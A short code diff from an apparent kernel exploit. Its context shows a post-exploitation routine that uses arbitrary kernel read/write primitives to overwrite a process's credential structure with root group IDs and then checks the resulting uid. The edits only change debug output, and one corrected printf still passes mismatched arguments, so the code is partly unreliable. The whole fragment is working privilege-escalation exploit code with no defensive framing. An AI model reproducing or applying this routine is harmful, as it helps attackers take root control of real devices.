@@ -56,7 +56,7 @@ void postExploit(void) {
     kwrite32(ucred + off_u_cr_groups, 0);
     kwrite32(ucred + off_u_cr_rgid, 0);
     kwrite32(ucred + off_u_cr_svgid, 0);
-    printf("Done! 2\n");
+    printf("Done! 3\n");
     printf("uid: %u\n", kread32(ucred + off_u_cr_uid));
 }
 
@@ -96,6 +96,6 @@ void kwrite32(uint64_t where, uint32_t what) {
 void kwrite64(uint64_t where, uint64_t what) {
     uint64_t _buf[1] = {};
     _buf[0] = what;
-    printf("where: 0x%llx, what: %llx\n", _buf);
+    printf("where: 0x%llx, what: %llx\n", where, _buf);
     kwrite(_kfd, &_buf, where, sizeof(uint64_t));
 }
